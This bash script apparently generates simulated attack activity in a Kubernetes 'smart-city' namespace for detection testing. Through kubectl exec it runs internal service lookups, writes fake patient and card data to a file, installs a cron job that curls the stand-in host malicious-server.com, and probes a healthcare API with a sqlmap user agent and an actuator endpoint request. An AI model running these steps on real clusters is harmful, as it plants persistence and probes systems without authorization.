#!/bin/bash

set -euo pipefail

if [[ -n "${KUBECONFIG:-}" && ! -r "${KUBECONFIG}" && -r "$HOME/.kube/config" ]]; then
    export KUBECONFIG="$HOME/.kube/config"
fi

command -v kubectl >/dev/null 2>&1 || { echo "❌ kubectl not found"; exit 1; }
kubectl cluster-info >/dev/null 2>&1 || { echo "❌ Kubernetes cluster not reachable"; exit 1; }

echo "🎯 Generating Advanced Attack Scenarios..."

ATTACK_POD=""
for label in iot-device iot-device-enhanced iot-simulator traffic-camera healthcare-api; do
    ATTACK_POD=$(kubectl get pods -n smart-city -l app="$label" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
    if [[ -n "$ATTACK_POD" ]]; then
        break
    fi
done
[[ -n "$ATTACK_POD" ]] || { echo "❌ No suitable pod found"; exit 1; }

run_in_pod() {
    local cmd="$1"
    kubectl exec -n smart-city "$ATTACK_POD" -- sh -c "$cmd" >/dev/null 2>&1 || true
}

# 1. LATERAL MOVEMENT SIMULATION
echo "1. 🔄 Lateral Movement Simulation"
run_in_pod 'nslookup healthcare-api-service.smart-city.svc.cluster.local >/dev/null || true; nslookup prometheus.monitoring.svc.cluster.local >/dev/null || true'
echo "Command attempted"
echo ""

# 2. DATA EXFILTRATION ATTEMPT
echo "2. 📤 Data Exfiltration Attempt"
run_in_pod 'echo "patient_data=john_doe:medical_history:confidential" > /tmp/sensitive.txt; echo "credit_cards=1234-5678-9012-3456" >> /tmp/sensitive.txt'
echo "Command attempted"
echo ""

# 3. PERSISTENCE MECHANISM
echo "3. ⏰ Persistence Mechanism"
run_in_pod '(crontab -l 2>/dev/null; echo "*/5 * * * * curl http://malicious-server.com/checkin") | crontab - 2>/dev/null || true'
echo "Command attempted"
echo ""

# 4. APPLICATION EXPLOITATION
echo "4. 🎯 Application Exploitation"
run_in_pod 'curl -s "http://healthcare-api-service:8080/api/patients/1" -H "User-Agent: sqlmap" >/dev/null || true; curl -s "http://healthcare-api-service:8080/actuator/env" >/dev/null || true'
echo "Command attempted"
echo ""

echo "✅ Advanced attack scenarios generated!"
